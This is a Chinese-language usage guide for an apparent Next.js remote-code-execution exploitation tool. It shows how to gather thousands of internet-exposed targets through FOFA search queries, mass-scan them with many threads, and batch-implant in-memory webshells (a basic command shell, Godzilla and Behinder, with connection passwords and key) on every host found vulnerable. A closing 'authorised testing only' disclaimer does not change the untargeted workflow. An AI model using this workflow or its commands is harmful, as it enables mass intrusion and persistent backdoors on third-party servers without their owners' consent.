# Next.js RCE 漏洞检测工具 - 完整使用指南

## 🎯 目标

本工具用于检测和利用特定版本Next.js中的RCE漏洞,帮助安全研究人员和渗透测试人员进行授权的安全测试。

## ⚠️ 前置知识

### 漏洞特点
- **影响版本**: Next.js 13.x - 15.x（具体版本取决于修复状态）
- **攻击原理**: 原型链污染 + Server Actions 代码注入
- **前置条件**: 目标应用必须启用 Server Actions 功能
- **检测难度**: 中等（需要找到合适的目标）

### 为什么检测成功率不高?

1. **版本限制** - 只有特定版本受影响
2. **功能需求** - 需要启用Server Actions
3. **环境差异** - 不同的部署和配置方式
4. **WAF拦截** - 一些应用可能配置了WAF

## 📋 完整工作流程

### 第一步：准备目标列表

#### 方式1: 使用FOFA搜索（推荐）

1. **访问FOFA官网** - https://fofa.info
2. **使用以下搜索语句之一**:

   **最高效的搜索语句**:
   ```
   body="__NEXT_DATA__" && status_code="200"
   ```
   
   **更精准的搜索语句**:
   ```
   body="__NEXT_DATA__" && body="form"
   body="__NEXT_DATA__" && body="serverActions"
   body="__NEXT_DATA__" && country="CN"
   ```

3. **导出结果**:
   - 选择 "导出" - CSV 或 TXT 格式
   - 推荐下载 5000-10000 个目标开始

4. **提取URL** (如果是CSV格式):
   ```bash
   # 从CSV提取URL列表
   awk -F',' '{print $2}' fofa_results.csv > targets.txt
   ```

#### 方式2: 手动输入

创建 `targets.txt` 文件,每行一个URL:
```
http://example.com
https://example.org:3000
http://192.168.1.1:8000
```

### 第二步：批量检测

#### 基础检测 (5-10 个线程)
```bash
./nextjs-rce-tool --check --file targets.txt --threads 5
```

#### 快速检测 (20-30 个线程,耗时较短,但占用资源多)
```bash
./nextjs-rce-tool --check --file targets.txt --threads 20
```

#### 自定义输出文件
```bash
./nextjs-rce-tool --check --file targets.txt --threads 10 --output my_results.txt
```

### 第三步：查看结果

检测完成后,工具会生成 `vulnerable_时间戳.txt` 文件,包含:

```
# Next.js RCE 漏洞检测结果
# 检测时间: 2025-12-10 18:30:00
# 发现漏洞数量: 5
# ========================================

[1] http://target1.com
    状态: 存在漏洞
    检测POC: POC 2
    详细信息: 重定向检测成功 - /login?a=uid=0(root)
    检测时间: 2025-12-10 18:30:15

[2] http://target2.com
    ...

# ========================================
# 纯URL列表（可直接用于批量注入）
# ========================================

http://target1.com
http://target2.com
```

### 第四步：注入内存马（可选）

#### 注入到所有漏洞目标
```bash
# 提取纯URL列表并注入Godzilla内存马
tail -n +15 vulnerable_20251210_183000.txt > vulnerable_urls.txt
./nextjs-rce-tool --shell --type godzilla --file vulnerable_urls.txt --threads 5
```

#### 内存马类型

**基础内存马** - 简单命令执行
```bash
./nextjs-rce-tool --shell --type basic --target http://example.com
# 使用: http://example.com/exec?cmd=whoami
```

**Godzilla 哥斯拉** - 功能完整，可视化界面
```bash
./nextjs-rce-tool --shell --type godzilla --target http://example.com
# 使用Godzilla客户端，连接密码: pass
# 密钥: 3c6e0b8a9c15224a
```

**Behinder 冰蝎** - 功能完整，更隐蔽
```bash
./nextjs-rce-tool --shell --type behinder --target http://example.com
# 使用冰蝎客户端，连接密码: rebeyond
```

## 📊 性能优化建议

### 线程数选择
| 线程数 | 速度 | 资源占用 | 推荐场景 |
|-------|------|--------|---------|
| 1-5 | 慢 | 低 | 小规模测试,网络差 |
| 5-10 | 中 | 中 | 一般使用,推荐 |
| 10-20 | 快 | 中高 | 大规模测试 |
| 20+ | 很快 | 高 | 超大规模,服务器环境 |

### 网络优化
- **国内网络**: 推荐线程数 5-10
- **国际网络**: 可增加到 10-20
- **如果超时**: 降低线程数或增加超时时间

## 🔍 检测不到漏洞的原因分析

### 常见原因

1. **版本不匹配** (最常见)
   - 应用可能已更新到已修复版本
   - 应用版本太老,不在易受攻击范围
   - **解决**: 尝试多个不同FOFA搜索语句

2. **Server Actions未启用**
   - 应用虽然是Next.js,但没有使用Server Actions
   - **解决**: 手动检查目标是否有表单/API端点

3. **WAF拦截**
   - 目标配置了Web应用防火墙
   - **解决**: 确保在授权范围内,必要时调整检测策略

4. **网络问题**
   - 连接超时或丢包
   - **解决**: 检查网络,降低线程数,增加超时时间

5. **POC覆盖不完整**
   - 目标使用了本工具未考虑的路由端点
   - **解决**: 手动验证或告知开发者补充POC

## 💡 实战技巧

### 技巧1: 分批检测
```bash
# 先测试小规模,确认工具工作正常
./nextjs-rce-tool --check --target http://known-vulnerable-target.com

# 确认成功后再大规模批量
./nextjs-rce-tool --check --file targets.txt --threads 10
```

### 技巧2: 关键词精准搜索
```
# 搜索包含特定关键词的应用,更可能存在漏洞
body="__NEXT_DATA__" && body="serverActions" && country="CN"
body="__NEXT_DATA__" && body="form" && body="server"
```

### 技巧3: 端口特定搜索
```
# 开发环境更可能存在漏洞
body="__NEXT_DATA__" && port="3000"
body="__NEXT_DATA__" && port="8000"
body="__NEXT_DATA__" && port="8080"
```

### 技巧4: 环境特定搜索
```
# 测试/开发环境
body="__NEXT_DATA__" && domain="dev"
body="__NEXT_DATA__" && domain="test"
body="__NEXT_DATA__" && domain="staging"
```

## 📝 命令参考

### 检测模式
```bash
# 单个目标
./nextjs-rce-tool --check --target http://example.com

# 批量检测
./nextjs-rce-tool --check --file targets.txt

# 自定义线程和输出
./nextjs-rce-tool --check --file targets.txt --threads 15 --output result.txt
```

### 注入模式
```bash
# 注入到单个目标
./nextjs-rce-tool --shell --type godzilla --target http://example.com

# 批量注入
./nextjs-rce-tool --shell --type godzilla --file targets.txt --threads 10
```

### 内存马类型
- `basic` - 基础内存马
- `godzilla` - Godzilla哥斯拉
- `behinder` - Behinder冰蝎

## ⚠️ 法律声明

- **仅供授权测试使用**
- 未经授权的访问是违法的
- 使用者需自行承担所有法律责任
- 不可用于生产环境或未授权的目标

## 📚 相关文档

- [FOFA搜索语句.md](FOFA搜索语句.md) - 更多搜索语句
- [POC说明.md](POC说明.md) - 技术细节
- [内存马使用文档.md](内存马使用文档.md) - 内存马详细用法
- [README.md](README.md) - 工具基本说明

## 🆘 故障排查

### 问题: 编译失败
```bash
# 确保Go版本 >= 1.16
go version

# 重新编译
go build -o nextjs-rce-tool
```

### 问题: 连接超时
```bash
# 降低线程数
./nextjs-rce-tool --check --file targets.txt --threads 3

# 或手动增加超时时间(需修改源码)
```

### 问题: 权限不足
```bash
# 赋予执行权限
chmod +x nextjs-rce-tool
```

### 问题: 输出文件权限
```bash
# 确保有写入权限
chmod 755 ./
```

## 📧 反馈

如有问题或建议,请检查:
1. 目标是否真的存在漏洞
2. 网络连接是否正常
3. 参数是否正确
4. 查看相关文档

---

**最后更新**: 2025年12月10日  
**工具版本**: 1.0.0
